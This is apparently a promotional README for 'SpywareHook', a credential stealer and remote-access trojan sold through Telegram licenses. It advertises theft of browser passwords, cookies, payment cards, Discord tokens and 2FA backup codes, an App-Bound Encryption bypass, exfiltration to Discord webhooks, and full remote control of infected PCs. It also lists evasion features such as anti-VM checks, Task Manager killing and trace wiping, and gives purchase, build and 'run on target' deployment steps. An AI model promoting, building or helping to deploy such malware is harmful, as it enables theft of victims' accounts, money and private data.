<div align="center">

# SpywareHook

### The most complete stealer + control platform on the market.

**Premium data collection · Discord webhook pipeline · HWID remote control · Operator-grade panel**

[![Panel](https://img.shields.io/badge/Panel-spywarehook.com-white?style=for-the-badge)](https://spywarehook.com)
[![Telegram](https://img.shields.io/badge/Telegram-@spywarehookbot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/spywarehook)
[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://spywarehook.com)
[![Stack](https://img.shields.io/badge/Stack-Java_·_Next.js_·_Python-111?style=for-the-badge)](https://spywarehook.com)

<br />

*One stack. Full pipeline. Zero compromise.*

</div>

---

## Why SpywareHook?

Most stealers give you half a solution — a messy log dump and a dead webhook. **SpywareHook is different.**

We built an **end-to-end operator platform**: a hardened Java agent, instant Discord delivery, a modern web panel, Telegram license management, and a full **HWID remote control suite** — all in one product.

> **Not a reskin. Not a paste. The best stealer ecosystem you can run today.**

| Others | SpywareHook |
|--------|-------------|
| Browser logs only | Browsers + Discord + backup codes + screenshot + zip |
| Static webhook | Rich embeds, per-account Discord cards |
| No remote access | Live screen, shell, files, clipboard, processes |
| Ugly panel / none | Next.js operator panel with WAF + Telegram OTP |
| Manual builds | Panel + bot build pipeline (JAR / EXE, custom icon) |

---

## Features

### Data Collection — Best-in-Class Stealer

| Module | Details |
|--------|---------|
| **Chromium family** | Chrome, Chrome Beta, Edge, Brave, Vivaldi, Opera, Opera GX, Yandex, CocCoc, Chromium, Arc, DuckDuckGo |
| **Regional browsers** | 360 Chrome, QQ Browser, Sogou Explorer, DCBrowser, Vought |
| **Firefox** | Full profile support — passwords, cookies, history, autofill |
| **App-Bound Encryption** | Chrome ABE bypass via injected key extraction |
| **Passwords** | All profiles, formatted export, top-password + Gmail highlight embeds |
| **Cookies** | Netscape format, session-ready |
| **History & Autofill** | Full browsing data per profile |
| **Payment cards** | Chromium saved cards |
| **Downloads** | Download history per browser |
| **Discord tokens** | Multi-source scan (Discord app, Chromium, Firefox, IndexedDB, Session Storage) |
| **Discord enrichment** | Live API lookup — username, ID, email, phone, Nitro, badges, avatar, MFA/backup flags |
| **Backup codes scanner** | Deep scan Desktop / Documents / Downloads / Pictures + OneDrive — 30+ platforms (Discord, Google, Steam, GitHub, Epic, Riot, Binance, PayPal, Apple, Telegram, Roblox, and more) |
| **Screenshot** | Instant desktop capture on every run |
| **Zip archive** | Organized `spywarehook.zip` with all loot |

### Delivery & Routing

- **Discord webhook embeds** — clean, branded, operator footer
- **Per-account Discord cards** — avatar, badges, token, backup status
- **Separate alerts** — most-used password, Gmail credential highlight
- **Remote re-grab** — trigger fresh collection from the control panel

### HWID Remote Control — Built-In RAT

Connect to any infected machine from the panel. No third-party RAT needed.

| Tab | Capability |
|-----|------------|
| **Screen** | Live stream, mouse + keyboard input, zoom (1x–5x), pan, quality presets |
| **Files** | Browse, upload, download, delete, mkdir — full remote FS |
| **Shell** | Remote command execution |
| **Processes** | List + kill |
| **Clipboard** | Read / write |
| **System** | Shutdown, restart, logoff, lock, sleep |
| **Info** | Hostname, HWID, OS, IP, resolution, online status |
| **Warn** | Custom Windows-style alert dialogs (sticky or timed) |
| **Talk** | Live chat dock with the victim machine |
| **Grab** | On-demand re-steal from panel |

WebSocket-backed, signed agent handshake, auto-reconnect with backoff.

### Agent Hardening

- **Anti-VM** — sandbox / hypervisor detection, silent exit
- **Task Manager block** — silent watchdog kills `taskmgr.exe`
- **Single-instance lock** — no duplicate runs
- **Post-steal wipe** — trace cleanup when RAT mode is off
- **String obfuscation** — no plain literals in binary
- **Signed request layer** — panel API auth on agent traffic

### Operator Panel

Modern **Next.js** dashboard at [spywarehook.com](https://spywarehook.com):

- **Dashboard** — stats, recent logs, quick actions
- **HWID list** — all connected machines, online/offline, one-click control
- **Control page** — full RAT UI with tab navigation, hero header, status pills
- **Log download** — grab latest steal zip per host directly from HWID list
- **Build center** — JAR / EXE builds with custom label, icon, staged progress
- **Logs** — full steal history with zip download
- **Seats** — sub-key management for resellers
- **Admin** — users, keys, themes, WAF rules, announcements, audit

**Auth:** License key + **Telegram OTP** — no password leaks, no shared creds.

**Infra:** Caddy reverse proxy · Cloudflare WAF · rate limiting · hook ID/secret routing


## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Operator Layer                          │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │
│  │  Web Panel   │  │ Telegram Bot │  │  Discord Webhook │  │
│  │  (Next.js)   │  │   (Python)   │  │    (delivery)    │  │
│  └──────┬───────┘  └──────┬───────┘  └────────▲─────────┘  │
│         │                 │                    │            │
│         └────────┬────────┘                    │            │
│                  ▼                             │            │
│         ┌────────────────┐                     │            │
│         │   API + WAF      │                     │            │
│         │   (Caddy/CF)     │                     │            │
│         └────────┬─────────┘                     │            │
└──────────────────┼───────────────────────────────┼────────────┘
                   │ WebSocket + REST              │ embed + zip
                   ▼                               │
         ┌─────────────────┐              ┌───────┴────────┐
         │   Java Agent    │──────────────│  Victim PC     │
         │  (JAR / EXE)    │   exfil      │  Win10/11      │
         └─────────────────┘              └────────────────┘
```

**Components:**

| Path | Role |
|------|------|
| `core/` | Java agent — steal, pack, exfil, RAT hub |
| `web/` | Next.js operator panel |
| `bot/` | Telegram license + build bot |
| `caddy/` | Reverse proxy + Cloudflare integration |
| `scripts/` | Build, deploy, WAF automation |

---

## Steal Pipeline

```
boot → anti-vm → lock → sync (Discord tokens)
     → backup codes scan → browser pull (all profiles)
     → zip pack → webhook push (embed + file)
     → discord account cards → screenshot
     → [optional] RAT hub (persistent WebSocket)
```

Every run produces a **structured zip** plus **rich Discord notifications** — not a raw text dump.

---

## Browser Support

<details>
<summary><b>Full browser list (click to expand)</b></summary>

**Chromium-based:**
Chrome · Chrome Beta · Microsoft Edge · Brave · Vivaldi · Opera · Opera GX · Yandex · CocCoc · Chromium · Arc · DuckDuckGo · 360 Chrome / 360ChromeX · QQ Browser · Sogou Explorer · DCBrowser · Vought

**Gecko:**
Mozilla Firefox (all profiles)

**Encryption:**
DPAPI · AES-GCM · **App-Bound Encryption (ABE) bypass**

</details>

---

## Backup Codes — 30+ Platforms

Automatic filesystem scan with filename + content matching:

Discord · Google · Steam · GitHub · Microsoft · Facebook · Instagram · Twitter/X · Epic · Riot · Twitch · Binance · Coinbase · PayPal · Amazon · Apple · Telegram · Roblox · Minecraft · Battle.net · Blizzard · EA · Origin · Ubisoft · Snapchat · TikTok · Reddit · LinkedIn · Yahoo · Proton · Bitwarden · LastPass · *and more*

Results organized under `backup codes/{platform}/` inside the zip.

---

## Screenshots

> *Panel and control UI previews — add your own screenshots here before publishing.*

| Landing | HWID List | Control — Screen |
|---------|-----------|------------------|
| `[screenshot]` | `[screenshot]` | `[screenshot]` |

| Build Center | Discord Delivery | Log Download |
|--------------|------------------|--------------|
| `[screenshot]` | `[screenshot]` | `[screenshot]` |

---

## Quick Start

### 1. Get a license

Join our Telegram: [**t.me/spywarehook**](https://t.me/spywarehook)

- **Trial** — message admins in the channel and request a trial key  
- **Full access** — purchase a license key from admins

### 2. Activate

Open [@spywarehookbot](https://t.me/spywarehookbot) → `/activate YOUR-KEY`

### 3. Set webhook

```
/webhook https://discord.com/api/webhooks/...
```

Or configure in the panel after login.

### 4. Build

**Panel:** [spywarehook.com/build](https://spywarehook.com/build) — choose JAR or EXE, set icon + label.

**Bot:**
```
/build jar
/build exe MyLabel
```

### 5. Deploy & monitor

Run the artifact on target → logs hit your webhook → machine appears in **HWID list** → open **Control** for live access.

---

## Tech Stack

| Layer | Technology |
|-------|------------|
| Agent | Java 17+, JNA, SQLite JDBC |
| Panel | Next.js 15, React, Tailwind, shadcn/ui |
| Bot | Python, aiogram |
| Proxy | Caddy |
| Edge | Cloudflare WAF |
| DB | SQLite (panel) |
| Comms | REST + WebSocket, signed requests |

---

## Comparison

| Feature | Typical stealer | SpywareHook |
|---------|----------------|-------------|
| Browser count | 3–5 | **15+** |
| ABE bypass | ❌ | ✅ |
| Discord enrichment | ❌ | ✅ badges, nitro, avatar |
| Backup codes | ❌ | ✅ 30+ platforms |
| Built-in RAT | ❌ | ✅ full suite |
| Web panel | ❌ / basic | ✅ modern Next.js |
| Telegram licensing | ❌ | ✅ |
| Custom EXE builds | ❌ | ✅ icon + label |
| WAF-protected panel | ❌ | ✅ |
| Remote re-grab | ❌ | ✅ |

---

## FAQ

**Is this better than RedLine / Raccoon / Vidar?**  
Those are dead, detected, or resold a thousand times. SpywareHook is a **living platform** — panel, bot, RAT, builds, and active updates in one stack.

**Do I need a separate RAT?**  
No. HWID control gives you screen, shell, files, clipboard, processes, and more out of the box.

**JAR or EXE?**  
Both. EXE supports custom icon and filename for delivery. JAR is lighter for specific scenarios.

**How do I get a key?**  
Join [t.me/spywarehook](https://t.me/spywarehook). Ask admins for a **trial key** or buy a full license in-channel.

**How does auth work?**  
License key bound to your Telegram. Panel login requires key + one-time Telegram code. No shared passwords.

**Can I resell?**  
Seat keys available for licensed resellers — contact admins on Telegram.

---

## Links

| | |
|---|---|
| **Panel** | [spywarehook.com](https://spywarehook.com) |
| **Telegram** | [t.me/spywarehook](https://t.me/spywarehook) — trial & purchases |
| **Bot** | [@spywarehookbot](https://t.me/spywarehookbot) — activate, build, webhook |

---

<div align="center">

**SpywareHook** — *The premium stealer platform for serious operators.*

<br />

`Java agent` · `Discord pipeline` · `HWID control` · `Telegram auth` · `Next.js panel`

<br />

© 2026 SpywareHook · All rights reserved

</div>
